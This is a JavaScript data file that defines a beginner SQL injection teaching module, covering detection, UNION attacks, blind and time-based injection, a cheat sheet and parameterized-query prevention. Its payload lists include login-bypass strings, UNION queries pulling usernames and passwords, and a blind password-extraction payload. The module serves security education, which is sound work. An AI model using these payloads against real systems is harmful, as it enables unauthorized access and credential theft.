export const SQL_INJECTION_LEARNING_MODULE = {
  id: 'sql-injection',
  slug: 'sql-injection',
  title: 'SQL Injection',
  domain: 'Web Security',
  level: 'Beginner',
  difficulty: 'Beginner',
  estimatedTime: 90,
  status: 'published',
  summary: 'SQL injection is a web vulnerability that lets an attacker manipulate database queries and access unauthorized data or modify application behavior.',
  overview: [
    'Learn what SQL injection is and why it matters.',
    'Understand how attackers inject payloads into query parameters.',
    'Practice different SQLi patterns such as UNION attacks, blind injection, and time-based attacks.',
    'Learn how parameterized queries prevent SQL injection in real applications.'
  ],
  learningObjectives: [
    'Define SQL injection and explain its impact.',
    'Identify common SQLi entry points and payload patterns.',
    'Differentiate between classic, blind, and UNION-based SQLi.',
    'Apply safe coding practices like parameterized queries.'
  ],
  prerequisites: [
    'Basic understanding of SQL and database tables.',
    'Familiarity with HTTP requests and query parameters.'
  ],
  quickFacts: [
    'SQL injection usually happens when user input is concatenated into a SQL query.',
    'Attackers often start with a single quote or boolean condition like OR 1=1.',
    'The impact can include data theft, unauthorized login, privilege escalation, and deletion.',
    'Prepared statements are the standard fix for SQL injection.'
  ],
  sections: [
    {
      id: 'what-is-sql-injection',
      title: 'What is SQL injection?',
      objective: 'Understand the core concept and security impact.',
      explanation: 'SQL injection occurs when an attacker inserts malicious SQL syntax into a query parameter, causing the database to execute unintended commands.',
      keyTakeaways: [
        'The application builds a query using untrusted input.',
        'The malicious input changes the structure of the SQL statement.',
        'The database then returns data or performs actions that the attacker should not be allowed to do.'
      ],
      payloads: [
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT username, password FROM users--"
      ],
      examples: [
        {
          title: 'Retrieving hidden data',
          query: "SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1",
          explanation: 'This query bypasses the category and release filters and returns more records than intended.'
        },
        {
          title: 'Login bypass',
          query: "SELECT * FROM users WHERE username = 'administrator'--' AND password = ''",
          explanation: 'The SQL comment prevents the password check from running, allowing an attacker to log in as administrator.'
        }
      ]
    },
    {
      id: 'detecting-sqli',
      title: 'How to detect SQL injection vulnerabilities',
      objective: 'Use a systematic testing approach.',
      explanation: 'Security testers look for differences in responses after submitting suspicious SQL syntax or boolean logic.',
      keyTakeaways: [
        'Start by sending a single quote and watching for errors or response anomalies.',
        'Compare responses for true and false conditions such as OR 1=1 and OR 1=2.',
        'Use timing or out-of-band payloads when the application is blind.'
      ],
      payloads: [
        "'",
        "OR 1=1",
        "OR 1=2",
        "'; WAITFOR DELAY '0:0:10'--"
      ],
      notes: [
        'The goal is to find any input that changes the query behavior without being sanitized.',
        'Burp Suite Scanner can help automate a large portion of the detection work.'
      ]
    },
    {
      id: 'union-attacks',
      title: 'UNION attacks',
      objective: 'Retrieve data from other database tables.',
      explanation: 'A UNION attack appends a second SELECT statement to the original query and can combine the result sets when the column counts match.',
      keyTakeaways: [
        'The original query and injected query must return the same number of columns.',
        'Each column must be compatible with the data type used by the injected value.',
        'NULL is often used to test column counts because it can be cast into many data types.'
      ],
      payloads: [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT username, password FROM users--"
      ],
      examples: [
        {
          title: 'Determine the number of columns',
          query: "' ORDER BY 1--",
          explanation: 'If the application errors after ORDER BY 3, the original query probably has 2 columns.'
        },
        {
          title: 'Find a text-friendly column',
          query: "' UNION SELECT 'a',NULL,NULL--",
          explanation: 'If the application accepts the string "a" in a column, that column can hold text data.'
        }
      ]
    },
    {
      id: 'blind-sqli',
      title: 'Blind SQL injection',
      objective: 'Exploit injection when query results are not visible.',
      explanation: 'Blind SQL injection works by sending conditions that trigger different responses, errors, or timing delays, letting the attacker infer the answer to true or false statements.',
      keyTakeaways: [
        'The application may reveal a welcome-back message depending on a boolean condition.',
        'A conditional error or delay can also reveal the truth value of the condition.',
        'Out-of-band channels such as DNS or Burp Collaborator can leak exfiltrated data.'
      ],
      payloads: [
        "xyz' AND '1'='1",
        "xyz' AND '1'='2",
        "xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm",
        "'; IF (1=1) WAITFOR DELAY '0:0:10'--"
      ],
      examples: [
        {
          title: 'Conditional responses',
          explanation: 'The attacker compares a response that does and does not include a success message to infer whether the SQL condition is true.'
        },
        {
          title: 'Time-based SQLi',
          explanation: 'When a condition is true, the application waits before responding, which proves the injected condition evaluated to true.'
        }
      ]
    },
    {
      id: 'prevention',
      title: 'How to prevent SQL injection',
      objective: 'Use secure coding patterns that preserve query structure.',
      explanation: 'Prepared statements prevent user input from changing the structure of the SQL query. They are the standard defense for data-bound input.',
      keyTakeaways: [
        'Use parameterized queries instead of concatenating strings directly into SQL.',
        'Do not trust data that comes from user inputs, even after validation.',
        'Whitelist values when untrusted input is used in table names, column names, or ORDER BY clauses.'
      ],
      codeExample: {
        vulnerable: "String query = \"SELECT * FROM products WHERE category = '\" + input + \"'\";",
        safe: 'PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");\nstatement.setString(1, input);',
        explanation: 'The prepared statement treats the value as data, not executable SQL syntax.'
      }
    }
  ],
  cheatSheet: [
    {
      category: 'String concatenation',
      syntax: {
        Oracle: "'foo'||'bar'",
        Microsoft: "'foo'+'bar'",
        PostgreSQL: "'foo'||'bar'",
        MySQL: "'foo' 'bar'"
      }
    },
    {
      category: 'Comments',
      syntax: {
        Oracle: '--comment',
        Microsoft: '--comment/*comment*/',
        PostgreSQL: '--comment/*comment*/',
        MySQL: '#comment or -- comment'
      }
    },
    {
      category: 'Condition tests',
      syntax: {
        General: "OR 1=1", 
        General2: "OR 1=2",
        ErrorBased: "SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END"
      }
    },
    {
      category: 'Time delays',
      syntax: {
        Microsoft: "IF (1=1) WAITFOR DELAY '0:0:10'",
        PostgreSQL: 'SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END',
        MySQL: 'SELECT IF(1=1,SLEEP(10),\'a\')'
      }
    },
    {
      category: 'Database introspection',
      syntax: {
        Microsoft: 'SELECT * FROM information_schema.tables',
        PostgreSQL: 'SELECT * FROM information_schema.tables',
        MySQL: 'SELECT * FROM information_schema.tables'
      }
    }
  ],
  commonPayloads: [
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT username, password FROM users--",
    "admin'--",
    "'; IF (1=1) WAITFOR DELAY '0:0:10'--",
    "'; SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--"
  ],
  labProgress: {
    totalLabs: 25,
    solved: 4,
    title: 'Vulnerability labs',
    summary: 'A practical learner should aim to solve foundational SQLi labs before moving to blind and time-based payloads.'
  },
  studyTips: [
    'Start with one query at a time and verify how the response changes.',
    'Remember that a single quote often breaks syntax and helps reveal the app structure.',
    'Always test both true and false conditions to understand the behavior.',
    'Use the same payload pattern against several inputs to see where SQLi is possible.'
  ],
  examChecklist: [
    'Can I describe the difference between first-order and second-order SQLi?',
    'Do I know how UNION attacks require matching column counts?',
    'Can I explain why blind SQLi can still leak data without visible results?',
    'Can I identify parameterized queries as the main mitigation technique?'
  ],
  references: [
    'CyberNex SQL Injection learning module',
    'OWASP SQL Injection Prevention Cheat Sheet',
    'OWASP Testing Guide - SQL Injection'
  ]
};

export const STUDENT_LEARNING_MODULES = [SQL_INJECTION_LEARNING_MODULE];

export default {
  SQL_INJECTION_LEARNING_MODULE,
  STUDENT_LEARNING_MODULES
};
